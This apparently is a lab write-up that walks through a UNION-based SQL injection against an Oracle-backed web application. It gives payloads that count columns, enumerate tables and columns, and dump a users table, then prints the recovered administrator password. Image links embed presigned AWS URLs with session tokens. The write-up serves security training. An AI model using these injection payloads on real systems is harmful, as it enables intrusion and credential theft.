# Listing the database contents on Oracle database.

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--
```

![](https://miro.medium.com/v2/resize:fit:700/0*RPJRor8IdZC7Ib_t)

```text
' ORDER BY 2--
```

![](https://miro.medium.com/v2/resize:fit:700/0*_T6LLNa9qwkWRm-g)

```text
' ORDER BY 3--
```

![](https://miro.medium.com/v2/resize:fit:700/0*6o_cR09enYU_U8PS)

```text
' ORDER BY 3--                           → Returns an error message.
```

**Therefore there are 2 columns returned by the original query.**

**STEP #2**

Discover the column that contains the data type string.

**NOTE**

`' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**

![](https://miro.medium.com/v2/resize:fit:700/0*ZSORyG6-bFJm5eky)

```text
' UNION SELECT 'a', NULL FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*4xkIIOJbvVxq6rWg)

```text
' UNION SELECT NULL, 'a' FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*bxnCaG6WLBhuYcAp)

```text
' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
```

Therefore both column 1 and 2 contain that data type string.

**STEP #3**

Determine the table names.

```text
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
```

![](https://miro.medium.com/v2/resize:fit:700/0*0CxW812qQQf9_TiW)

Let’s find a table which contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*4NHKFGCB_bT_Qigx)

Table name: `USERS_KDXGKJ`

**STEP #4**

Determine the column names of the table** **`USERS_KDXGKJ`**.**

```text
' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e308f541-4e56-4255-bd10-524cee85e1b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663MGCNM5X%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215419Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpGi0qzmSToXJ2bumMLHbnvaZz%2Fd%2B3Ulokiy2q9GtJQAiEAz5B8qHk7ZgtygxUqYs5PpfoHRA4AbfX6O7UEVNkuBdQqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDL9kYqkthSGH8uyZpCrcA4%2FNAhe32cUR4CY%2BDBfvtB1IL2hbXdEuhUdv0jmxceUQNAw48d1n6EcmoC75Y662JG6p8U9LhUpatKuMRgGLYYgNaNfjjL%2FTAdSh155UzMX2ndB2kI1dT7UJk%2BrCAyrAnmQzzE1Xbww4PJXzP3UQegQnw%2Fql4bNd3PryuYv8RG%2BqMeqFsRfagHRvFLmXv%2B1ECaKnFs5S6eHfeyF44eQ%2BtIuCOw6%2BwZSYrwOWe6zzu4wQxZQJb6oSLkrYVGrUZKwyrEavQitHIoMHQE4Y2xatw5bJFQJBkAg5O2J2%2F2aBQT3%2BM6sme3GiJ7cdFJO0RyoLqFf%2FXe2Pn3VLpXIQEHkkO7JeiJi0ZfJ7JQYle8nwZXzq6J6DrOFThXnLhnhC29eABBFbiaiBeSDgNKT8nVam%2Bj2gwTFWZAuTBwXWtMryDG6%2Fp4cEhMSKCIZeMAIbxkQNmpbD%2FAzVcuMMIpMksEC0XK53xlMaGv%2FQEbOrmol%2Fodyin9fp9%2F0c4yos2qRcIyXtzRZ3F9pb92tQeS%2BbLwJC0tcxg7MAumC3wJypp9WxZeZKBA6IEuFF7v2xfmAQ2bpsDyrQ4zxV9QfLB3Gk8hxOUbN9yngLlHr8TjxyG%2FK0cw4MMYJUEiKSGtqruoZBMO%2BGo9QGOqUBQQzulsB2adATTqFjRTTIXIg%2Fk9BdFbk62ussc6VMAnG%2BkrdmzoCEwRCYt%2BALtnpcyIgELsVSaAW5sjCJJ2tCmDAfb3q6CV1znWo1l%2BdxOMfGzc734rgmP2P%2B5HAanmXghGyKHIlHNnGYJyDkLCpvgoYM26r5BeZ1W88OQjljrVmZrlOdt8LKhKgsnF81pqDGBECV8VWYmgc0DeYB3yIYpOgPf%2FRH&X-Amz-Signature=d6d01e67e8742f2a56f710db7312a87514d3a53e4814ad9a9c07430c75b57a33&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`USERS_KDXGKJ`**.**

`username: USERNAME_CSUMYK`

`password: PASSWORD_AIOQBO`

---

**STEP #5**

Retrieve the administrator user’s password from the database.

```text
' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3ab7ff68-30f8-4bf2-937a-fe782827a0b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663MGCNM5X%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215419Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpGi0qzmSToXJ2bumMLHbnvaZz%2Fd%2B3Ulokiy2q9GtJQAiEAz5B8qHk7ZgtygxUqYs5PpfoHRA4AbfX6O7UEVNkuBdQqiAQIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDL9kYqkthSGH8uyZpCrcA4%2FNAhe32cUR4CY%2BDBfvtB1IL2hbXdEuhUdv0jmxceUQNAw48d1n6EcmoC75Y662JG6p8U9LhUpatKuMRgGLYYgNaNfjjL%2FTAdSh155UzMX2ndB2kI1dT7UJk%2BrCAyrAnmQzzE1Xbww4PJXzP3UQegQnw%2Fql4bNd3PryuYv8RG%2BqMeqFsRfagHRvFLmXv%2B1ECaKnFs5S6eHfeyF44eQ%2BtIuCOw6%2BwZSYrwOWe6zzu4wQxZQJb6oSLkrYVGrUZKwyrEavQitHIoMHQE4Y2xatw5bJFQJBkAg5O2J2%2F2aBQT3%2BM6sme3GiJ7cdFJO0RyoLqFf%2FXe2Pn3VLpXIQEHkkO7JeiJi0ZfJ7JQYle8nwZXzq6J6DrOFThXnLhnhC29eABBFbiaiBeSDgNKT8nVam%2Bj2gwTFWZAuTBwXWtMryDG6%2Fp4cEhMSKCIZeMAIbxkQNmpbD%2FAzVcuMMIpMksEC0XK53xlMaGv%2FQEbOrmol%2Fodyin9fp9%2F0c4yos2qRcIyXtzRZ3F9pb92tQeS%2BbLwJC0tcxg7MAumC3wJypp9WxZeZKBA6IEuFF7v2xfmAQ2bpsDyrQ4zxV9QfLB3Gk8hxOUbN9yngLlHr8TjxyG%2FK0cw4MMYJUEiKSGtqruoZBMO%2BGo9QGOqUBQQzulsB2adATTqFjRTTIXIg%2Fk9BdFbk62ussc6VMAnG%2BkrdmzoCEwRCYt%2BALtnpcyIgELsVSaAW5sjCJJ2tCmDAfb3q6CV1znWo1l%2BdxOMfGzc734rgmP2P%2B5HAanmXghGyKHIlHNnGYJyDkLCpvgoYM26r5BeZ1W88OQjljrVmZrlOdt8LKhKgsnF81pqDGBECV8VWYmgc0DeYB3yIYpOgPf%2FRH&X-Amz-Signature=3fabbdce8d6febf7fad5281adb030ba4f2962b468a7d8af669bb2a02402e80fc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

|  |  |
|---|---|
| administrator | r1xyd5uo3kcovvqm73jl |

Use the password to get administrators access to the web application.
